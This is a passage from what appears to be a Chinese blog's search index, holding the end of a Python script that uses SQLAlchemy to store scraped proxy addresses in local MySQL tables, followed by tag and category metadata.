    link_port <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        conn_type <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        verify_time <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    Base<span class="token punctuation">.</span>metadata<span class="token punctuation">.</span>create_all<span class="token punctuation">(</span>engine<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">MysqlOperation</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>engine <span class="token operator">=</span> create_engine<span class="token punctuation">(</span><span class="token string">'mysql+mysqlconnector://root:root@localhost:3306/proxies'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">,</span> echo<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> max_overflow<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>Session_Class <span class="token operator">=</span> sessionmaker<span class="token punctuation">(</span>bind<span class="token operator">=</span>self<span class="token punctuation">.</span>engine<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>Session <span class="token operator">=</span> self<span class="token punctuation">.</span>Session_Class<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>merge_infos<span class="token punctuation">,</span> self<span class="token punctuation">.</span>alive_infos <span class="token operator">=</span> MaintainProxyPool<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>check_alive<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_start_index</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># start_index 得到uncheck_proxies表中的行数</span>        start_index_uncheck <span class="token operator">=</span> self<span class="token punctuation">.</span>Session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>CreateTables<span class="token punctuation">.</span>UncheckProxies<span class="token punctuation">)</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token punctuation">)</span>        start_index_checked <span class="token operator">=</span> self<span class="token punctuation">.</span>Session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>CreateTables<span class="token punctuation">.</span>UsableProxy<span class="token punctuation">)</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> start_index_uncheck<span class="token punctuation">,</span> start_index_checked    <span class="token keyword">def</span> <span class="token function">write_uncheck_to_database</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        start_index<span class="token punctuation">,</span> _ <span class="token operator">=</span> self<span class="token punctuation">.</span>get_start_index<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> info <span class="token keyword">in</span> self<span class="token punctuation">.</span>merge_infos<span class="token punctuation">:</span>            address<span class="token punctuation">,</span> port<span class="token punctuation">,</span> conn_type<span class="token punctuation">,</span> v_time <span class="token operator">=</span> info<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> info<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> info<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> info<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>            res <span class="token operator">=</span> self<span class="token punctuation">.</span>Session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>CreateTables<span class="token punctuation">.</span>UncheckProxies<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>CreateTables<span class="token punctuation">.</span>UncheckProxies<span class="token punctuation">.</span>ip_address <span class="token operator">==</span> address<span class="token punctuation">)</span><span class="token punctuation">.</span>all<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> len<span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                start_index <span class="token operator">+=</span> <span class="token number">1</span>                t <span class="token operator">=</span> CreateTables<span class="token punctuation">.</span>UncheckProxies<span class="token punctuation">(</span>id<span class="token operator">=</span>start_index<span class="token punctuation">,</span> ip_address<span class="token operator">=</span>address<span class="token punctuation">,</span> link_port<span class="token operator">=</span>port<span class="token punctuation">,</span> conn_type<span class="token operator">=</span>conn_type<span class="token punctuation">,</span> verify_time<span class="token operator">=</span>v_time<span class="token punctuation">)</span>                self<span class="token punctuation">.</span>Session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>t<span class="token punctuation">)</span>                self<span class="token punctuation">.</span>Session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 正在往'uncheck_proxy'数据库中写入一条新的代理信息..."</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] 数据库中已包含此条代理信息,将不执行新增操作"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">write_alive_to_database</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        _<span class="token punctuation">,</span> start_index <span class="token operator">=</span> self<span class="token punctuation">.</span>get_start_index<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> info <span class="token keyword">in</span> self<span class="token punctuation">.</span>alive_infos<span class="token punctuation">:</span>            address<span class="token punctuation">,</span> port<span class="token punctuation">,</span> conn_type<span class="token punctuation">,</span> v_time <span class="token operator">=</span> info<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> info<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> info<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> info<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>            res <span class="token operator">=</span> self<span class="token punctuation">.</span>Session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>CreateTables<span class="token punctuation">.</span>UsableProxy<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>CreateTables<span class="token punctuation">.</span>UsableProxy<span class="token punctuation">.</span>ip_address <span class="token operator">==</span> address<span class="token punctuation">)</span><span class="token punctuation">.</span>all<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> len<span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                start_index <span class="token operator">+=</span> <span class="token number">1</span>                t <span class="token operator">=</span> CreateTables<span class="token punctuation">.</span>UsableProxy<span class="token punctuation">(</span>id<span class="token operator">=</span>start_index<span class="token punctuation">,</span> ip_address<span class="token operator">=</span>address<span class="token punctuation">,</span> link_port<span class="token operator">=</span>port<span class="token punctuation">,</span> conn_type<span class="token operator">=</span>conn_type<span class="token punctuation">,</span> verify_time<span class="token operator">=</span>v_time<span class="token punctuation">)</span>                self<span class="token punctuation">.</span>Session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>t<span class="token punctuation">)</span>                self<span class="token punctuation">.</span>Session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 正在往'alive_proxy'数据库中写入一条新的代理信息..."</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] 数据库中已包含此条代理信息,将不执行新增操作"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>self<span class="token punctuation">.</span>write_uncheck_to_database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        t2 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>self<span class="token punctuation">.</span>write_alive_to_database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    MysqlOperation<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Tips：如果有侵权的地方，请第一时间联系我，我会马上处理"><a href="#Tips：如果有侵权的地方，请第一时间联系我，我会马上处理" class="headerlink" title="Tips：如果有侵权的地方，请第一时间联系我，我会马上处理"></a>Tips：如果有侵权的地方，请第一时间联系我，我会马上处理</h3><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Python、Spider </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Spider </tag>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
